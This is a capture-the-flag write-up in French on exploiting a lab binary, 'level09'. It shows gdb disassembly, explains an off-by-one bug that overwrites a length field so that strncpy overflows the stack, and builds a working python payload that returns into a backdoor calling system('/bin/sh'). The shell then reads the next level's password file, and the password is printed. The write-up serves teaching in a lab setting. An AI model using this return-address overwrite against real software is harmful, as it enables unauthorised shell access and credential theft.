LEVEL 09
========

Analyse du programme:
---------------------

gdb level09
set disassembly-flavor intel
disas main
Dump of assembler code for function main:
   0x0000000000000aa8 <+0>:		push   rbp
   0x0000000000000aa9 <+1>:		mov    rbp,rsp
   0x0000000000000aac <+4>:		lea    rdi,[rip+0x15d]        # 0xc10
   0x0000000000000ab3 <+11>:	call   0x730 <puts@plt>		// puts(Message de départ)
   0x0000000000000ab8 <+16>:	call   0x8c0 <handle_msg>	// handle_msg()
   0x0000000000000abd <+21>:	mov    eax,0x0				// return 0
   0x0000000000000ac2 <+26>:	pop    rbp
   0x0000000000000ac3 <+27>:	ret

disas handle_msg
Dump of assembler code for function handle_msg:
   0x00005555555548c0 <+0>:		push   rbp
   0x00005555555548c1 <+1>:		mov    rbp,rsp
   0x00005555555548c4 <+4>:		sub    rsp,0xc0
   0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]				// struct user{ char *msg, char *name, int msglen}
   0x00005555555548d2 <+18>:	add    rax,0x8c
   0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
   0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
   0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
   0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
   0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0		// bzero(user.name, 40)
   0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c		// user.msglen = 140
   0x0000555555554906 <+70>:	lea    rax,[rbp-0xc0]
   0x000055555555490d <+77>:	mov    rdi,rax
   0x0000555555554910 <+80>:	call   0x5555555549cd <set_username>	// set_username(struct user)
   0x0000555555554915 <+85>:	lea    rax,[rbp-0xc0]
   0x000055555555491c <+92>:	mov    rdi,rax
   0x000055555555491f <+95>:	call   0x555555554932 <set_msg>			// set_msg(struct user)
   0x0000555555554924 <+100>:	lea    rdi,[rip+0x295]        # 0x555555554bc0
   0x000055555555492b <+107>:	call   0x555555554730 <puts@plt>		// puts(">: Msg sent!")
   0x0000555555554930 <+112>:	leave  
   0x0000555555554931 <+113>:	ret 

disas set_username
Dump of assembler code for function set_username:
   0x00005555555549cd <+0>:		push   rbp
   0x00005555555549ce <+1>:		mov    rbp,rsp
   0x00005555555549d1 <+4>:		sub    rsp,0xa0
   0x00005555555549d8 <+11>:	mov    QWORD PTR [rbp-0x98],rdi		// param struct
   0x00005555555549df <+18>:	lea    rax,[rbp-0x90]				// buf[144]
   0x00005555555549e6 <+25>:	mov    rsi,rax
   0x00005555555549e9 <+28>:	mov    eax,0x0
   0x00005555555549ee <+33>:	mov    edx,0x10
   0x00005555555549f3 <+38>:	mov    rdi,rsi
   0x00005555555549f6 <+41>:	mov    rcx,rdx
   0x00005555555549f9 <+44>:	rep stos QWORD PTR es:[rdi],rax		// bzero(buf, 144)
   0x00005555555549fc <+47>:	lea    rdi,[rip+0x1e1]        # 0x555555554be4
   0x0000555555554a03 <+54>:	call   0x555555554730 <puts@plt>	// puts(">: Enter your username")
   0x0000555555554a08 <+59>:	lea    rax,[rip+0x1d0]        # 0x555555554bdf
   0x0000555555554a0f <+66>:	mov    rdi,rax
   0x0000555555554a12 <+69>:	mov    eax,0x0
   0x0000555555554a17 <+74>:	call   0x555555554750 <printf@plt>	// printf(">>: ")
   0x0000555555554a1c <+79>:	mov    rax,QWORD PTR [rip+0x201595]        # 0x555555755fb8
   0x0000555555554a23 <+86>:	mov    rax,QWORD PTR [rax]
   0x0000555555554a26 <+89>:	mov    rdx,rax
   0x0000555555554a29 <+92>:	lea    rax,[rbp-0x90]
   0x0000555555554a30 <+99>:	mov    esi,0x80
   0x0000555555554a35 <+104>:	mov    rdi,rax
   0x0000555555554a38 <+107>:	call   0x555555554770 <fgets@plt>	// fgets(buf, 128, stdin)
   0x0000555555554a3d <+112>:	mov    DWORD PTR [rbp-0x4],0x0		// int i = 0
   0x0000555555554a44 <+119>:	jmp    0x555555554a6a <set_username+157>
   0x0000555555554a46 <+121>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000555555554a49 <+124>:	cdqe   
   0x0000555555554a4b <+126>:	movzx  ecx,BYTE PTR [rbp+rax*1-0x90]	// buf[i]
   0x0000555555554a53 <+134>:	mov    rdx,QWORD PTR [rbp-0x98]			// user.msg
   0x0000555555554a5a <+141>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000555555554a5d <+144>:	cdqe   
   0x0000555555554a5f <+146>:	mov    BYTE PTR [rdx+rax*1+0x8c],cl		// user.name = buf[i]
   0x0000555555554a66 <+153>:	add    DWORD PTR [rbp-0x4],0x1			// i++
   0x0000555555554a6a <+157>:	cmp    DWORD PTR [rbp-0x4],0x28			// cmp i et 0x28
   0x0000555555554a6e <+161>:	jg     0x555555554a81 <set_username+180>	// if i > 0x28 jump top 1+80
   0x0000555555554a70 <+163>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000555555554a73 <+166>:	cdqe   
   0x0000555555554a75 <+168>:	movzx  eax,BYTE PTR [rbp+rax*1-0x90]	// buf[i]
   0x0000555555554a7d <+176>:	test   al,al							// test buf[i] et 0x0
   0x0000555555554a7f <+178>:	jne    0x555555554a46 <set_username+121>	// if (buf[i] != 0) jump top 121
   0x0000555555554a81 <+180>:	mov    rax,QWORD PTR [rbp-0x98]
   0x0000555555554a88 <+187>:	lea    rdx,[rax+0x8c]				// struct user + 140 = user.name
   0x0000555555554a8f <+194>:	lea    rax,[rip+0x165]        # 0x555555554bfb
   0x0000555555554a96 <+201>:	mov    rsi,rdx
   0x0000555555554a99 <+204>:	mov    rdi,rax
   0x0000555555554a9c <+207>:	mov    eax,0x0
   0x0000555555554aa1 <+212>:	call   0x555555554750 <printf@plt> // printf(">: Welcome, %s", user.name)
   0x0000555555554aa6 <+217>:	leave  
   0x0000555555554aa7 <+218>:	ret

disas set_msg
Dump of assembler code for function set_msg:
   0x0000555555554932 <+0>:		push   rbp
   0x0000555555554933 <+1>:		mov    rbp,rsp
   0x0000555555554936 <+4>:		sub    rsp,0x410
   0x000055555555493d <+11>:	mov    QWORD PTR [rbp-0x408],rdi	// param struct user
   0x0000555555554944 <+18>:	lea    rax,[rbp-0x400]				// char	buf[1024]
   0x000055555555494b <+25>:	mov    rsi,rax
   0x000055555555494e <+28>:	mov    eax,0x0
   0x0000555555554953 <+33>:	mov    edx,0x80
   0x0000555555554958 <+38>:	mov    rdi,rsi
   0x000055555555495b <+41>:	mov    rcx,rdx
   0x000055555555495e <+44>:	rep stos QWORD PTR es:[rdi],rax		// bzero(buf, 1024)
   0x0000555555554961 <+47>:	lea    rdi,[rip+0x265]        # 0x555555554bcd
   0x0000555555554968 <+54>:	call   0x555555554730 <puts@plt>	// puts(">: Msg @Unix-Dude")
   0x000055555555496d <+59>:	lea    rax,[rip+0x26b]        # 0x555555554bdf
   0x0000555555554974 <+66>:	mov    rdi,rax
   0x0000555555554977 <+69>:	mov    eax,0x0
   0x000055555555497c <+74>:	call   0x555555554750 <printf@plt>	// printf(">>: ")
   0x0000555555554981 <+79>:	mov    rax,QWORD PTR [rip+0x201630]        # 0x555555755fb8
   0x0000555555554988 <+86>:	mov    rax,QWORD PTR [rax]
   0x000055555555498b <+89>:	mov    rdx,rax
   0x000055555555498e <+92>:	lea    rax,[rbp-0x400]
   0x0000555555554995 <+99>:	mov    esi,0x400
   0x000055555555499a <+104>:	mov    rdi,rax
   0x000055555555499d <+107>:	call   0x555555554770 <fgets@plt>	// fgets(buf, 1024,stdin)
   0x00005555555549a2 <+112>:	mov    rax,QWORD PTR [rbp-0x408]
   0x00005555555549a9 <+119>:	mov    eax,DWORD PTR [rax+0xb4]
   0x00005555555549af <+125>:	movsxd rdx,eax
   0x00005555555549b2 <+128>:	lea    rcx,[rbp-0x400]
   0x00005555555549b9 <+135>:	mov    rax,QWORD PTR [rbp-0x408]
   0x00005555555549c0 <+142>:	mov    rsi,rcx
   0x00005555555549c3 <+145>:	mov    rdi,rax
   0x00005555555549c6 <+148>:	call   0x555555554720 <strncpy@plt>	// strncpy(user->msg, buf, user->msglen)
   0x00005555555549cb <+153>:	leave  
   0x00005555555549cc <+154>:	ret

disas secret_backdoor
Dump of assembler code for function secret_backdoor:
   0x000055555555488c <+0>:	push   rbp
   0x000055555555488d <+1>:	mov    rbp,rsp
   0x0000555555554890 <+4>:	add    rsp,0xffffffffffffff80
   0x0000555555554894 <+8>:	mov    rax,QWORD PTR [rip+0x20171d]        # 0x555555755fb8
   0x000055555555489b <+15>:	mov    rax,QWORD PTR [rax]
   0x000055555555489e <+18>:	mov    rdx,rax
   0x00005555555548a1 <+21>:	lea    rax,[rbp-0x80]				// buf[128]
   0x00005555555548a5 <+25>:	mov    esi,0x80
   0x00005555555548aa <+30>:	mov    rdi,rax
   0x00005555555548ad <+33>:	call   0x555555554770 <fgets@plt>	// fgets(buf, 128, stdin)
   0x00005555555548b2 <+38>:	lea    rax,[rbp-0x80]
   0x00005555555548b6 <+42>:	mov    rdi,rax
   0x00005555555548b9 <+45>:	call   0x555555554740 <system@plt>	// system(buf)
   0x00005555555548be <+50>:	leave  
   0x00005555555548bf <+51>:	ret

Pas de buffer overflow possible avec strncpy dans la fonction set_msg()
car le buffer dans structure est de taille 40 et la longueur dans strncpy
est de 40 aussi.
Le n de strncpy est défini par rapport au msglen de la structure:

typedef struct 	s_user {
	char	msg[140];
	char	name[40];
	int		msglen;
}				t_user;

Dans la fonction set_username() il y une faille exploitable.
Il y a une boucle while qui va remplir caractère par caractère
le username de la structure.
La condition de ce while est:
while (buf[i] <= 40)

En sachant que i commence à 0. Donc il va jusqu'a 41 et non 40.

Grâce à cette faille nous allons réecrire la valeur de msglen.

Payload partie 1:
(40 octets pour remplir le buffer) + (valeur max possible d'un octet) + (\n pour séparer les 2 strings)
--------------A*40------------------------------\xff---------------------------------\x0a-------------

Donc là nous avons la première partie qui va réecrire le int msglen,
qui va remplir le buffer de 40 et pour finir on sépare les 2 strings
avec un \n.


Maintenant il faut trouver l'offset, avec quelques tests on remarque
que l'offset est de 200.

run <<<$(python -c 'print "A"*40+"\xff"+"\x0a"+"B"*208')
Avec cette ligne on voit bien que RSP est remplie

Il faut trouver l'adresse de secret_backdoor() qui contient system():
info functions secret_backdoor
0x0000 55 55 55 55 48 8c			= adresse secret_backdoor()
\x8c\x48\x55\x55\x55\x55\x00\x00	= adresse en little endian

Dans la fonction secret_backdoor() il y a un fgets qui va être
le paramètre de system(). Donc derrière l'adresse de la fonction,
on va mettre "/bin/sh"

Payload partie 2:
(offset de 200) + (adresse de secret_backdoor()) + (\n pour séparer les strings) + ("/bin/sh")
-----B*200--------\x8c\x48\x55\x55\x55\x55\x00\x00------------\x0a------------------"/bin/sh"-

Exploitation du programme:
--------------------------

python -c 'print "A"*40+"\xff"+"\x0a"+"B"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00"+"\x0a"+"/bin/sh"' > /tmp/lvl09
cat /tmp/lvl09 - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

Connexion au level suivant:
---------------------------

su end
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

cat end
GG !
